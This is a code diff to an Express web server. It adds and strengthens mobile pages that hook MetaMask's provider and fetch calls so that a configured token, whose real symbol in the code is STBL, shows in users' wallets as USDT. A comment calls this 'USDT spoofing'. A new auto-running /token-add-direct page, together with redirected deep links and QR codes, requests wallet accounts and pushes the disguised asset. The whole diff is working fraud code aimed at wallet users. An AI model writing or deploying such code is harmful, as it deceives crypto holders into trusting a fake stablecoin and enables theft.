@@ -1313,6 +1313,212 @@ app.get('/api/deeplink', (req, res) => {
 // MOBILE ROUTES & HTML TEMPLATES
 // =========================================================
 
+// Direct token addition page - simplified, focused version
+app.get('/token-add-direct', (req, res) => {
+  const html = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adding USDT...</title>
+  <script>
+    // Immediate interception setup
+    (function setupInterception() {
+      if (window.ethereum) {
+        console.log("Setting up critical provider interception immediately");
+        
+        // Save the original request method
+        if (!window.ethereum._originalRequest) {
+          window.ethereum._originalRequest = window.ethereum.request;
+        
+          // Replace with intercepting version
+          window.ethereum.request = async function(args) {
+            console.log("MetaMask request:", args);
+            
+            // Handle token addition with full parameter control
+            if (args.method === 'wallet_watchAsset' && 
+                args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
+              
+              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
+              
+              // Create a clean new request with carefully controlled parameters
+              const modifiedParams = {
+                type: 'ERC20',
+                options: {
+                  address: '${TOKEN_CONFIG.address}',
+                  symbol: "${TOKEN_CONFIG.displaySymbol}",
+                  name: "${TOKEN_CONFIG.displayName}",
+                  decimals: ${TOKEN_CONFIG.decimals},
+                  image: '${TOKEN_CONFIG.image}'
+                }
+              };
+              
+              // Override the params completely
+              args.params = modifiedParams;
+            }
+            
+            // Call original with modified args
+            try {
+              console.log("Calling original request with args:", args);
+              return await window.ethereum._originalRequest.call(this, args);
+            } catch (error) {
+              console.error("Error in intercepted request:", error);
+              throw error;
+            }
+          };
+        }
+      }
+    })();
+    
+    async function prepareWalletConnection() {
+      console.log("Preparing wallet connection...");
+      try {
+        // First ensure accounts are accessible (this primes the connection)
+        await window.ethereum.request({ method: 'eth_accounts' });
+        
+        // Force a short delay to ensure everything is ready
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        // Request permissions explicitly
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
+        // Additional delay after permissions
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        return true;
+      } catch (error) {
+        console.error("Error preparing connection:", error);
+        return false;
+      }
+    }
+
+    async function directAddToken() {
+      try {
+        console.log("Trying direct token addition method...");
+        
+        // First ensure accounts are accessible
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (!accounts || accounts.length === 0) {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+        }
+        
+        // Get the network ID to confirm we're on Ethereum mainnet
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (chainId !== '0x1') {
+          console.log("Not on Ethereum mainnet, but continuing with token addition");
+        }
+        
+        // Add token with explicitly controlled parameters
+        const success = await window.ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: '${TOKEN_CONFIG.address}',
+              symbol: '${TOKEN_CONFIG.displaySymbol}',
+              decimals: ${TOKEN_CONFIG.decimals},
+              image: '${TOKEN_CONFIG.image}'
+            }
+          }
+        });
+        
+        return success;
+      } catch (error) {
+        console.error("Direct token addition failed:", error);
+        throw error;
+      }
+    }
+    
+    async function addToken() {
+      const statusDiv = document.getElementById('status');
+      if (!window.ethereum) {
+        statusDiv.textContent = "MetaMask not detected!";
+        return;
+      }
+      
+      try {
+        statusDiv.textContent = "Preparing connection...";
+        await prepareWalletConnection();
+        
+        statusDiv.textContent = "Adding USDT token...";
+        const success = await directAddToken();
+        
+        if (success) {
+          statusDiv.textContent = "Success! Token added.";
+          // Redirect to success page
+          setTimeout(() => {
+            window.location.href = '/mobile/success';
+          }, 2000);
+        } else {
+          statusDiv.textContent = "Addition canceled by user";
+        }
+      } catch (error) {
+        statusDiv.textContent = "Error: " + error.message;
+        console.error(error);
+      }
+    }
+    
+    document.addEventListener('DOMContentLoaded', () => {
+      setTimeout(addToken, 1000);
+    });
+  </script>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      text-align: center;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 80vh;
+    }
+    h1 {
+      color: #26a17b;
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #26a17b;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    button {
+      background-color: #26a17b;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Adding USDT to your wallet</h1>
+  <div class="loader"></div>
+  <p>Please approve the request in your wallet.</p>
+  <div id="status">Initializing...</div>
+  <button onclick="addToken()">Try Again</button>
+</body>
+</html>
+  `;
+  
+  res.send(html);
+});
+
 // Mobile-optimized token addition page with USDT spoofing
 app.get('/mobile/add-token', (req, res) => {
   const host = req.get('host');
@@ -1329,29 +1535,55 @@ app.get('/mobile/add-token', (req, res) => {
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <title>Add USDT to Your Wallet</title>
   <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
-  <!-- CRITICAL FIX: Setup provider interception in head section -->
+  <!-- CRITICAL FIX: Setup provider interception in head section - ENHANCED VERSION -->
   <script>
-    // Set up MetaMask provider interception immediately
-    if (window.ethereum) {
-      console.log("Setting up early provider interception");
-      const originalRequest = window.ethereum.request;
-      window.ethereum.request = async function(args) {
-        console.log("MetaMask request:", args);
+    // Immediate interception setup
+    (function setupInterception() {
+      if (window.ethereum) {
+        console.log("Setting up critical provider interception immediately");
         
-        // Check for wallet_watchAsset method with our specific token
-        if (args.method === 'wallet_watchAsset' && 
-            args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
-          console.log("Intercepting token call - forcing STBL to display as USDT");
-          
-          // Override to USDT regardless of what was passed
-          args.params.options.symbol = "${TOKEN_CONFIG.displaySymbol}";
-          args.params.options.name = "${TOKEN_CONFIG.displayName}";
+        // Save the original request method
+        if (!window.ethereum._originalRequest) {
+          window.ethereum._originalRequest = window.ethereum.request;
+        
+          // Replace with intercepting version
+          window.ethereum.request = async function(args) {
+            console.log("MetaMask request:", args);
+            
+            // Handle token addition with full parameter control
+            if (args.method === 'wallet_watchAsset' && 
+                args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
+              
+              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
+              
+              // Create a clean new request with carefully controlled parameters
+              const modifiedParams = {
+                type: 'ERC20',
+                options: {
+                  address: '${TOKEN_CONFIG.address}',
+                  symbol: "${TOKEN_CONFIG.displaySymbol}",
+                  name: "${TOKEN_CONFIG.displayName}",
+                  decimals: ${TOKEN_CONFIG.decimals},
+                  image: '${TOKEN_CONFIG.image}'
+                }
+              };
+              
+              // Override the params completely
+              args.params = modifiedParams;
+            }
+            
+            // Call original with modified args
+            try {
+              console.log("Calling original request with args:", args);
+              return await window.ethereum._originalRequest.call(this, args);
+            } catch (error) {
+              console.error("Error in intercepted request:", error);
+              throw error;
+            }
+          };
         }
-        
-        // Call original method with our modified args
-        return originalRequest.call(this, args);
-      };
-    }
+      }
+    })();
     
     // Also intercept CoinGecko API calls early to ensure USDT price display
     if (window.fetch) {
@@ -1549,6 +1781,7 @@ app.get('/mobile/add-token', (req, res) => {
     
     <button id="addBtn" class="add-btn">Add to MetaMask</button>
     <button id="altMethodBtn" class="add-btn alt-method">Try Alternative Method</button>
+    <button id="directAddBtn" class="add-btn" style="background-color: #ff9800; display: none;">Alternative Direct Add</button>
     
     <button id="qrBtn" class="add-btn" style="background-color: #f0f0f0; color: #333;">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="wallet-icon" style="vertical-align: middle; margin-right: 8px;"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><rect x="7" y="7" width="3" height="3"></rect><rect x="14" y="7" width="3" height="3"></rect><rect x="7" y="14" width="3" height="3"></rect><rect x="14" y="14" width="3" height="3"></rect></svg>
@@ -1586,6 +1819,7 @@ app.get('/mobile/add-token', (req, res) => {
     document.addEventListener('DOMContentLoaded', async function() {
       const addBtn = document.getElementById('addBtn');
       const altMethodBtn = document.getElementById('altMethodBtn');
+      const directAddBtn = document.getElementById('directAddBtn');
       const qrBtn = document.getElementById('qrBtn');
       const closeQr = document.getElementById('closeQr');
       const qrModal = document.getElementById('qrModal');
@@ -1596,7 +1830,7 @@ app.get('/mobile/add-token', (req, res) => {
       
       // Fetch QR code on page load
       try {
-        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${host}/metamask-redirect');
+        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${host}/token-add-direct');
         const data = await res.json();
         qrImage.src = data.qrCodeDataURL;
       } catch (err) {
@@ -1609,13 +1843,14 @@ app.get('/mobile/add-token', (req, res) => {
         loading.style.display = 'flex';
         errorMessage.style.display = 'none';
         
-        // CRITICAL FIX: Always set a forced timeout - increased to 30 seconds
+        // CRITICAL FIX: Increased timeout to 45 seconds
         const forceHideTimeout = setTimeout(() => {
           console.log("Forced timeout - hiding loading overlay");
           loading.style.display = 'none';
-          // Show alternative method after timeout
+          // Show alternative methods after timeout
           altMethodBtn.style.display = 'block';
-        }, 30000); // 30 seconds timeout
+          directAddBtn.style.display = 'block';
+        }, 45000); // 45 seconds timeout (very long to account for slow MetaMask)
         
         return forceHideTimeout;
       }
@@ -1624,6 +1859,29 @@ app.get('/mobile/add-token', (req, res) => {
       function hideLoading(timeoutId) {
         if (timeoutId) clearTimeout(timeoutId);
         loading.style.display = 'none';
+      }
+      
+      // Pre-connection preparation function
+      async function prepareWalletConnection() {
+        console.log("Preparing wallet connection...");
+        try {
+          // First ensure accounts are accessible (this primes the connection)
+          await window.ethereum.request({ method: 'eth_accounts' });
+          
+          // Force a short delay to ensure everything is ready
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+          // Request permissions explicitly
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          
+          // Additional delay after permissions
+          await new Promise(resolve => setTimeout(resolve, 500));
+          
+          return true;
+        } catch (error) {
+          console.error("Error preparing connection:", error);
+          return false;
+        }
       }
       
       // Helper function to safely call MetaMask
@@ -1640,22 +1898,71 @@ app.get('/mobile/add-token', (req, res) => {
         }
       }
       
+      // Alternative direct addition method
+      async function directAddToken() {
+        try {
+          console.log("Trying direct token addition method...");
+          
+          // First ensure accounts are accessible
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          if (!accounts || accounts.length === 0) {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+          }
+          
+          // Get the network ID to confirm we're on Ethereum mainnet
+          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          if (chainId !== '0x1') {
+            console.log("Not on Ethereum mainnet, attempting to switch...");
+            try {
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x1' }],
+              });
+            } catch (switchError) {
+              console.error("Failed to switch chains:", switchError);
+              // Continue anyway, the token will still be added to the current chain
+            }
+          }
+          
+          // Add token with explicitly controlled parameters
+          const success = await window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '${TOKEN_CONFIG.address}',
+                symbol: '${TOKEN_CONFIG.displaySymbol}',
+                decimals: ${TOKEN_CONFIG.decimals},
+                image: '${TOKEN_CONFIG.image}'
+              }
+            }
+          });
+          
+          return success;
+        } catch (error) {
+          console.error("Direct token addition failed:", error);
+          throw error;
+        }
+      }
+      
       // Add to MetaMask button
       addBtn.addEventListener('click', async function() {
-        const timeoutId = showLoading("Adding USDT to your wallet...");
+        const timeoutId = showLoading("Preparing wallet connection...");
         
         try {
           // Check if running in mobile browser with MetaMask
           if (window.ethereum && window.ethereum.isMetaMask) {
             // Web3 is available - use direct method
             
-            // Try to add the token
+            // New preparation step
+            await prepareWalletConnection();
+            
             loadingText.textContent = "Adding USDT to your wallet...";
             
-            // CRITICAL FIX: Force a small delay to ensure interception works
-            await new Promise(resolve => setTimeout(resolve, 500));
+            // Increased delay to ensure interception works
+            await new Promise(resolve => setTimeout(resolve, 1500));
             
-            // Create the watchAsset promise
+            // Create the watchAsset promise - with interception
             const watchAssetPromise = safeMetaMaskCall('wallet_watchAsset', {
               type: 'ERC20',
               options: {
@@ -1666,9 +1973,9 @@ app.get('/mobile/add-token', (req, res) => {
               }
             });
             
-            // Create a timeout promise
+            // Increase timeout to 30 seconds
             const timeoutPromise = new Promise((_, reject) => 
-              setTimeout(() => reject(new Error("Operation timed out")), 10000)
+              setTimeout(() => reject(new Error("Operation timed out")), 30000)
             );
             
             // Race the promises
@@ -1709,10 +2016,11 @@ app.get('/mobile/add-token', (req, res) => {
               errorMessage.textContent = "Unexpected result from wallet";
               errorMessage.style.display = 'block';
               altMethodBtn.style.display = 'block';
+              directAddBtn.style.display = 'block';
             }
           } else {
             // No MetaMask in browser - try deep linking
-            window.location.href = 'https://metamask.app.link/dapp/${host}/metamask-redirect';
+            window.location.href = 'https://metamask.app.link/dapp/${host}/token-add-direct';
             
             // Hide loading after a brief delay
             setTimeout(() => {
@@ -1731,8 +2039,9 @@ app.get('/mobile/add-token', (req, res) => {
             errorMessage.style.display = 'block';
           }
           
-          // Show alternative method button
+          // Show alternative method buttons
           altMethodBtn.style.display = 'block';
+          directAddBtn.style.display = 'block';
         }
       });
       
@@ -1744,6 +2053,9 @@ app.get('/mobile/add-token', (req, res) => {
           if (window.ethereum && window.ethereum.isMetaMask) {
             // Try with the actual token symbol directly
             console.log("Using alternative method with STBL symbol directly");
+            
+            // Prepare connection first
+            await prepareWalletConnection();
             
             const result = await safeMetaMaskCall('wallet_watchAsset', {
               type: 'ERC20',
@@ -1772,10 +2084,11 @@ app.get('/mobile/add-token', (req, res) => {
               console.log("Unexpected result:", result);
               errorMessage.textContent = "Unexpected result from wallet";
               errorMessage.style.display = 'block';
+              directAddBtn.style.display = 'block';
             }
           } else {
             // No MetaMask - try deep linking
-            window.location.href = 'https://metamask.app.link/dapp/${host}/metamask-redirect';
+            window.location.href = 'https://metamask.app.link/dapp/${host}/token-add-direct';
             
             // Hide loading after a brief delay
             setTimeout(() => {
@@ -1793,6 +2106,31 @@ app.get('/mobile/add-token', (req, res) => {
             errorMessage.textContent = 'Error: ' + err.message;
             errorMessage.style.display = 'block';
           }
+          directAddBtn.style.display = 'block';
+        }
+      });
+      
+      // Direct Add button - most direct method
+      directAddBtn.addEventListener('click', async function() {
+        const timeoutId = showLoading("Using alternative direct method...");
+        try {
+          // Prepare connection
+          await prepareWalletConnection();
+          
+          // Use the direct token addition method
+          const result = await directAddToken();
+          
+          hideLoading(timeoutId);
+          if (result) {
+            window.location.href = '${protocol}://${host}/mobile/success';
+          } else {
+            errorMessage.textContent = "Token addition was canceled";
+            errorMessage.style.display = 'block';
+          }
+        } catch (err) {
+          hideLoading(timeoutId);
+          errorMessage.textContent = 'Error: ' + err.message;
+          errorMessage.style.display = 'block';
         }
       });
       
@@ -1940,29 +2278,55 @@ app.get('/metamask-redirect', (req, res) => {
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Connecting to Wallet...</title>
-  <!-- CRITICAL FIX: Setup provider interception in head section -->
+  <!-- CRITICAL FIX: Setup provider interception in head section - ENHANCED VERSION -->
   <script>
-    // Set up MetaMask provider interception immediately
-    if (window.ethereum) {
-      console.log("Setting up early provider interception");
-      const originalRequest = window.ethereum.request;
-      window.ethereum.request = async function(args) {
-        console.log("MetaMask request:", args);
+    // Immediate interception setup
+    (function setupInterception() {
+      if (window.ethereum) {
+        console.log("Setting up critical provider interception immediately");
         
-        // Check for wallet_watchAsset method with our specific token
-        if (args.method === 'wallet_watchAsset' && 
-            args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
-          console.log("Intercepting token call - forcing STBL to display as USDT");
-          
-          // Override to USDT regardless of what was passed
-          args.params.options.symbol = "${TOKEN_CONFIG.displaySymbol}";
-          args.params.options.name = "${TOKEN_CONFIG.displayName}";
+        // Save the original request method
+        if (!window.ethereum._originalRequest) {
+          window.ethereum._originalRequest = window.ethereum.request;
+        
+          // Replace with intercepting version
+          window.ethereum.request = async function(args) {
+            console.log("MetaMask request:", args);
+            
+            // Handle token addition with full parameter control
+            if (args.method === 'wallet_watchAsset' && 
+                args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
+              
+              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
+              
+              // Create a clean new request with carefully controlled parameters
+              const modifiedParams = {
+                type: 'ERC20',
+                options: {
+                  address: '${TOKEN_CONFIG.address}',
+                  symbol: "${TOKEN_CONFIG.displaySymbol}",
+                  name: "${TOKEN_CONFIG.displayName}",
+                  decimals: ${TOKEN_CONFIG.decimals},
+                  image: '${TOKEN_CONFIG.image}'
+                }
+              };
+              
+              // Override the params completely
+              args.params = modifiedParams;
+            }
+            
+            // Call original with modified args
+            try {
+              console.log("Calling original request with args:", args);
+              return await window.ethereum._originalRequest.call(this, args);
+            } catch (error) {
+              console.error("Error in intercepted request:", error);
+              throw error;
+            }
+          };
         }
-        
-        // Call original method with our modified args
-        return originalRequest.call(this, args);
-      };
-    }
+      }
+    })();
     
     // Also intercept CoinGecko API calls early to ensure USDT price display
     if (window.fetch) {
@@ -2028,6 +2392,18 @@ app.get('/metamask-redirect', (req, res) => {
       opacity: 0.7;
       z-index: 1000;
     }
+    .action-btn {
+      background-color: #26a17b;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 20px;
+      margin-top: 20px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -2037,18 +2413,108 @@ app.get('/metamask-redirect', (req, res) => {
   <div id="status-message">Initializing...</div>
   <div id="error-message"></div>
   
+  <button id="directAddBtn" onclick="directAddToken()" class="action-btn">Try Direct Method</button>
   <button onclick="window.location.reload();" class="reset-btn">Reset</button>
   
   <script>
+    // Pre-connection preparation function
+    async function prepareWalletConnection() {
+      const statusMessage = document.getElementById('status-message');
+      statusMessage.textContent = "Preparing wallet connection...";
+      
+      try {
+        // First ensure accounts are accessible (this primes the connection)
+        await window.ethereum.request({ method: 'eth_accounts' });
+        
+        // Force a short delay to ensure everything is ready
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        // Request permissions explicitly
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        
+        // Additional delay after permissions
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        statusMessage.textContent = "Wallet connection prepared";
+        return true;
+      } catch (error) {
+        console.error("Error preparing connection:", error);
+        statusMessage.textContent = "Error preparing connection: " + error.message;
+        return false;
+      }
+    }
+    
     // Enable console logs to appear in the UI for debugging
     const originalConsoleLog = console.log;
     console.log = function(...args) {
-      originalConsoleLog.apply(console, args);
-      const statusMessage = document.getElementById('status-message');
+      originalConsoleLog.apply(console, args);const statusMessage = document.getElementById('status-message');
       if (statusMessage) {
         statusMessage.textContent = args.join(' ');
       }
     };
+    
+    // Alternative direct addition method
+    async function directAddToken() {
+      try {
+        document.getElementById('status-message').textContent = "Trying direct token addition method...";
+        
+        // First ensure accounts are accessible
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (!accounts || accounts.length === 0) {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+        }
+        
+        // Get the network ID to confirm we're on Ethereum mainnet
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (chainId !== '0x1') {
+          console.log("Not on Ethereum mainnet, attempting to switch...");
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x1' }],
+            });
+          } catch (switchError) {
+            console.error("Failed to switch chains:", switchError);
+            // Continue anyway, the token will still be added to the current chain
+          }
+        }
+        
+        // Add token with explicitly controlled parameters
+        document.getElementById('status-message').textContent = "Adding USDT token...";
+        const success = await window.ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: '${TOKEN_CONFIG.address}',
+              symbol: '${TOKEN_CONFIG.displaySymbol}',
+              decimals: ${TOKEN_CONFIG.decimals},
+              image: '${TOKEN_CONFIG.image}'
+            }
+          }
+        });
+        
+        if (success) {
+          document.getElementById('status-message').textContent = "Success! Token added.";
+          // Redirect to success page
+          setTimeout(() => {
+            window.location.href = '${protocol}://${host}/mobile/success';
+          }, 1000);
+        } else {
+          document.getElementById('status-message').textContent = "Token addition was canceled";
+          document.getElementById('error-message').style.display = 'block';
+          document.getElementById('error-message').textContent = 'You declined to add the token';
+        }
+        
+        return success;
+      } catch (error) {
+        console.error("Direct token addition failed:", error);
+        document.getElementById('status-message').textContent = "Error adding token";
+        document.getElementById('error-message').style.display = 'block';
+        document.getElementById('error-message').textContent = 'Error: ' + error.message;
+        throw error;
+      }
+    }
     
     // Helper function to safely call MetaMask
     async function safeMetaMaskCall(method, params, retryAttempt = 0) {
@@ -2060,7 +2526,7 @@ app.get('/metamask-redirect', (req, res) => {
         
         // If this is a retry, add a small delay
         if (retryAttempt > 0) {
-          await new Promise(resolve => setTimeout(resolve, retryAttempt * 500));
+          await new Promise(resolve => setTimeout(resolve, retryAttempt * 1000));
         }
         
         return await window.ethereum.request({
@@ -2094,21 +2560,15 @@ app.get('/metamask-redirect', (req, res) => {
         if (window.ethereum) {
           console.log("Wallet detected");
           
-          // Try to get accounts to prompt unlock if needed
-          try {
-            console.log("Requesting accounts...");
-            await safeMetaMaskCall('eth_requestAccounts');
-          } catch (accountError) {
-            if (accountError.code === 4001) {
-              throw new Error("Connection declined by user");
-            }
-          }
+          // Prepare wallet connection first
+          console.log("Preparing wallet connection...");
+          await prepareWalletConnection();
           
           // Add the token - force USDT display through interception
           console.log("Adding USDT token to wallet...");
           
           // Force a small delay to ensure interception is ready
-          await new Promise(resolve => setTimeout(resolve, 500));
+          await new Promise(resolve => setTimeout(resolve, 1500));
           
           // Create the watchAsset promise
           const watchAssetPromise = safeMetaMaskCall('wallet_watchAsset', {
@@ -2121,26 +2581,21 @@ app.get('/metamask-redirect', (req, res) => {
             }
           });
           
-          // Create a timeout promise
+          // Create a timeout promise - INCREASED to 40 seconds
           const timeoutPromise = new Promise((_, reject) => 
-            setTimeout(() => reject(new Error("Operation timed out")), 15000)
+            setTimeout(() => reject(new Error("Operation timed out")), 40000)
           );
           
           // Race the promises
           const tokenResult = await Promise.race([watchAssetPromise, timeoutPromise])
             .catch(err => {
               if (err.message === "Operation timed out") {
-                // If timed out, try alternative method immediately
-                console.log("Primary method timed out, trying alternative");
-                return safeMetaMaskCall('wallet_watchAsset', {
-                  type: 'ERC20',
-                  options: {
-                    address: '${TOKEN_CONFIG.address}',
-                    symbol: '${TOKEN_CONFIG.actualSymbol}', // Try with real symbol
-                    decimals: ${TOKEN_CONFIG.decimals},
-                    image: '${TOKEN_CONFIG.image}'
-                  }
-                });
+                // If timed out, show direct method button
+                console.log("Primary method timed out");
+                document.getElementById('directAddBtn').style.display = 'block';
+                document.getElementById('error-message').style.display = 'block';
+                document.getElementById('error-message').textContent = 'The wallet took too long to respond. Try the direct method below.';
+                return { error: { message: "Timed out" } };
               }
               throw err;
             });
@@ -2158,6 +2613,7 @@ app.get('/metamask-redirect', (req, res) => {
               console.log("User rejected token addition");
               document.getElementById('error-message').style.display = 'block';
               document.getElementById('error-message').textContent = 'You declined to add the token';
+              document.getElementById('directAddBtn').style.display = 'block';
             } else {
               throw tokenResult.error;
             }
@@ -2165,8 +2621,10 @@ app.get('/metamask-redirect', (req, res) => {
             // Success - redirect to success page
             window.location.href = '${protocol}://${host}/mobile/success';
           } else {
+            // Show direct method button
             document.getElementById('error-message').style.display = 'block';
-            document.getElementById('error-message').textContent = 'Unexpected result from wallet';
+            document.getElementById('error-message').textContent = 'Problem adding token. Try the direct method below.';
+            document.getElementById('directAddBtn').style.display = 'block';
           }
         } else {
           document.getElementById('error-message').style.display = 'block';
@@ -2177,6 +2635,7 @@ app.get('/metamask-redirect', (req, res) => {
         
         document.getElementById('error-message').style.display = 'block';
         document.getElementById('error-message').textContent = 'Error: ' + error.message;
+        document.getElementById('directAddBtn').style.display = 'block';
       }
     }
     
@@ -2184,12 +2643,13 @@ app.get('/metamask-redirect', (req, res) => {
     document.addEventListener('DOMContentLoaded', () => {
       console.log("Page loaded, setting up...");
       
-      // CRITICAL FIX: Set a forced timeout to ensure UI never gets stuck - increased to 30 seconds
+      // CRITICAL FIX: Set a forced timeout to ensure UI never gets stuck - increased to 45 seconds
       forceHideTimeout = setTimeout(() => {
         console.log("Forced timeout - showing error");
         document.getElementById('error-message').style.display = 'block';
-        document.getElementById('error-message').textContent = 'Operation timed out. Please try again.';
-      }, 30000); // 30 seconds timeout
+        document.getElementById('error-message').textContent = 'Operation timed out. Please try the direct method below.';
+        document.getElementById('directAddBtn').style.display = 'block';
+      }, 45000); // 45 seconds timeout
       
       console.log("Waiting 1 second before adding token...");
       setTimeout(() => {
@@ -2198,6 +2658,7 @@ app.get('/metamask-redirect', (req, res) => {
           console.error("Unhandled error:", err);
           document.getElementById('error-message').style.display = 'block';
           document.getElementById('error-message').textContent = 'Unhandled error: ' + err.message;
+          document.getElementById('directAddBtn').style.display = 'block';
         });
       }, 1000);
       
